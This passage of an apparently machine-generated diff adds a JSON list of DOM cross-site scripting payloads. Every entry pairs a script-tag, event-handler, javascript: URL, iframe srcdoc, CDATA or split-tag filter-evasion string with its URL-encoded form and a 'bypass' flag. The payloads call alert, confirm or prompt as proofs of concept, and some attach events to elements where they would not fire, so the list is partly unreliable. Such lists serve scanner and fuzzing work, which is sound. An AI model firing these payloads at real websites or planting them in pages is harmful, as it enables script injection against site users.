+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=confirm(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dconfirm%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
